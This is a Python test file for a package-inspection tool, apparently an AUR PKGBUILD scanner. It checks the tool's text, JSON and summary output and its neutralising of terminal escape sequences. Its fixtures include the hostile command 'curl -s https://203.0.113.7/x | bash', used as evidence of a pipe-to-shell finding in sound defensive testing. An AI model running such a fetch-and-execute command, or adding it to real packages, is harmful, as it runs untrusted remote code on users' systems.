from __future__ import annotations

import json
import time

import pytest

from pkginspect import output
from pkginspect.fetchers import Package
from pkginspect.scoring import Evidence, Finding, ScoringResult

DAY = 86400


def make_result(score: int = 0, blocked: bool = True) -> ScoringResult:
    ev = Evidence("PKGBUILD", 12, "curl -s https://203.0.113.7/x | bash")
    return ScoringResult(
        score=score,
        findings=[
            Finding(0, "Has install script evil.install", "execution"),
            Finding(-25, "Suspicious host 203.0.113.7", "transport", "host", [ev]),
            Finding(-30, "Pipe to shell (curl|sh)", "execution", "pipe_to_shell", [ev]),
        ],
        categories={"execution": -30, "transport": -25},
        blocked=blocked,
        sources=["github.com/someone (git)"],
    )


def aur_pkg(**meta) -> Package:
    now = time.time()
    base = {
        "Name": "evil-pkg",
        "Version": "1.0-1",
        "Maintainer": None,
        "NumVotes": 0,
        "Popularity": 0.0,
        "FirstSubmitted": now - 2 * DAY,
        "LastModified": now - 2 * DAY,
        "OutOfDate": None,
    }
    base.update(meta)
    return Package(name="evil-pkg", source="aur", pkgbuild="pkgver=1\n", meta=base)


@pytest.fixture(autouse=True)
def no_color(monkeypatch):
    monkeypatch.setenv("NO_COLOR", "1")


def test_findings_sorted_with_evidence_and_info_last():
    text = output.format_text(make_result(), package=aur_pkg())
    assert text.index("-30") < text.index("-25") < text.index("ℹ")
    assert "PKGBUILD:12  curl -s https://203.0.113.7/x | bash" in text
    assert "Biggest flaw" not in text


def test_header_metadata_new_orphan_package():
    text = output.format_text(make_result(), package=aur_pkg())
    head = text.splitlines()[0]
    assert "evil-pkg 1.0-1 (AUR)" in head
    assert "0/100" in head and "Poor" in head and "blocked" in head
    assert "orphan" in text
    assert "0 votes" in text and "popularity 0.00" in text
    assert "(2 days ago)" in text
    assert "sources: github.com/someone (git)" in text


def test_no_days_ago_for_old_package():
    old = aur_pkg(Maintainer="jguer", FirstSubmitted=time.time() - 400 * DAY)
    text = output.format_text(make_result(100, False), package=old)
    assert "days ago" not in text
    assert "jguer" in text and "orphan" not in text


def test_out_of_date_and_dependency_label():
    pkg = aur_pkg(OutOfDate=time.time() - DAY)
    pkg.required_by = "yay"
    text = output.format_text(make_result(), package=pkg)
    assert "out of date since" in text
    assert "(AUR, dependency of yay)" in text


def test_no_findings():
    result = ScoringResult(score=100, findings=[], categories={})
    text = output.format_text(result, package=aur_pkg())
    assert "No issues found." in text


def test_version_from_pkgbuild_for_file():
    pkg = Package(name="x", source="file", pkgbuild="epoch=1\npkgver=2.0\npkgrel=3\n")
    head = output.format_text(make_result(), package=pkg).splitlines()[0]
    assert "x 1:2.0-3 (file)" in head


def test_old_call_style_still_works():
    result = make_result()
    assert "Pipe to shell" in output.format_text(result, lines=["a"], debug=True)
    data = json.loads(output.format_json(result, source="aur", package="foo"))
    assert data["meta"] == {"source": "aur", "package": "foo"}


def test_no_ansi_without_color(monkeypatch):
    text = output.format_text(make_result(), package=aur_pkg())
    assert "\033[" not in text
    monkeypatch.delenv("NO_COLOR")
    monkeypatch.setattr("sys.stdout.isatty", lambda: False, raising=False)
    assert "\033[" not in output.format_text(make_result(), package=aur_pkg())


def test_ansi_when_tty(monkeypatch):
    monkeypatch.delenv("NO_COLOR")
    monkeypatch.setattr(output, "_use_color", lambda: True)
    assert "\033[" in output.format_text(make_result(), package=aur_pkg())


def test_error_line():
    pkg = Package(name="nope", source="aur", error="not found in the AUR")
    assert output.format_error(pkg) == "✗ nope — not found in the AUR"


def test_summary_table():
    ok = Package(name="yay", source="aur")
    bad = Package(name="evil-pkg", source="aur")
    err = Package(name="nope", source="aur", error="not found in the AUR")
    entries = [
        (ok, ScoringResult(100, [], {})),
        (bad, make_result()),
        (err, None),
    ]
    rows = output.format_summary(entries).splitlines()
    assert rows[0] == "Summary"
    assert "100  yay" in rows[1]
    assert "evil-pkg" in rows[2] and "Pipe to shell (curl|sh)" in rows[2]
    assert rows[3].startswith("  ✗") and "not found in the AUR" in rows[3]


def test_json_single_object_shape():
    pkg = aur_pkg()
    data = json.loads(output.format_json(make_result(), pkg=pkg))
    assert data["blocked"] is True
    assert data["sources"] == ["github.com/someone (git)"]
    assert data["required_by"] is None
    assert data["meta"] == {"source": "aur", "package": "evil-pkg"}
    assert data["aur"]["maintainer"] is None
    assert data["aur"]["first_submitted"].endswith("Z")
    assert data["aur"]["out_of_date"] is None
    first = data["findings"][0]
    assert first["penalty"] == -30 and first["rule"] == "pipe_to_shell"
    assert first["evidence"] == [
        {"file": "PKGBUILD", "line": 12, "text": "curl -s https://203.0.113.7/x | bash"}
    ]


def test_json_non_aur_has_no_aur_object():
    pkg = Package(name="bash", source="official", pkgbuild="pkgver=5\n")
    data = json.loads(output.format_json(make_result(), pkg=pkg))
    assert "aur" not in data


def test_error_data():
    pkg = Package(name="nope", source="aur", error="not found in the AUR")
    assert output.error_data(pkg) == {
        "package": "nope",
        "source": "aur",
        "error": "not found in the AUR",
    }


def test_escape_sequences_are_neutralised():
    evil = "\x1b[2J\x1b[1A\x1b[2K\r\x07\u202e\x9b"
    ev = Evidence("a\x1b.install", 3, "x" + evil)
    result = ScoringResult(
        50,
        [Finding(-5, "msg" + evil, "execution", evidence=[ev])],
        {},
        sources=["host" + evil],
    )
    pkg = Package(name="n" + evil, source="aur", error="err" + evil, pkgbuild="")
    pkg.meta = {"Version": "1" + evil, "Maintainer": "m" + evil}
    texts = [
        output.format_text(result, package=pkg, lines=["l" + evil], debug=True),
        output.format_error(pkg),
        output.format_summary([(pkg, result), (pkg, None)]),
    ]
    for text in texts:
        assert "\x1b" not in text and "\r" not in text and "\x07" not in text
        assert "\u202e" not in text and "\x9b" not in text
    assert "\\x1b[2J" in texts[0]


def test_surrogate_name_prints(capsys):
    pkg = Package(name="ok", source="aur", error="bad \udcff.install")
    print(output.format_error(pkg))
    assert "\\udcff" in capsys.readouterr().out


def test_odd_meta_types_render():
    pkg = aur_pkg(
        Maintainer=42, NumVotes="many", Popularity="x", FirstSubmitted=float("nan")
    )
    pkg.meta["LastModified"] = "yesterday"
    text = output.format_text(make_result(), package=pkg)
    assert "evil-pkg" in text


def test_empty_summary():
    assert output.format_summary([]) == ""
